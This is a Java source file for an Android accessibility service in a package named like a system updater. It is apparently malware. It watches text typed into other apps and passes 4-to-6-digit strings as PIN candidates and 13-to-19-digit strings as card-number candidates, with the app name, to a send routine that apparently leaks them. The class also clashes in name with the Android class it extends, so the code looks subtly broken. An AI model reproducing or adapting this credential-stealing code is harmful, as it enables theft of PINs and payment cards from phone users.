package com.sysupd;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;

public class AccessibilityService extends AccessibilityService {
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
            AccessibilityEvent.TYPE_VIEW_CLICKED |
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    public void onAccessibilityEvent(AccessibilityEvent e) {
        try {
            String pkg = e.getPackageName() == null ? "" : e.getPackageName().toString();
            if (e.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                StringBuilder sb = new StringBuilder();
                for (CharSequence cs : e.getText()) sb.append(cs);
                String txt = sb.toString();
                if (txt.length() >= 4 && txt.length() <= 6 && txt.matches("\\d+")) {
                    Core.send("PIN_CANDIDATE",
                        "{\"pkg\":\"" + pkg + "\",\"value\":\"" + txt + "\"}");
                }
                if (txt.matches("\\d{13,19}")) {
                    Core.send("CC_CANDIDATE",
                        "{\"pkg\":\"" + pkg + "\",\"value\":\"" + txt + "\"}");
                }
            }
        } catch (Exception ex) {}
    }

    public void onInterrupt() {}
}
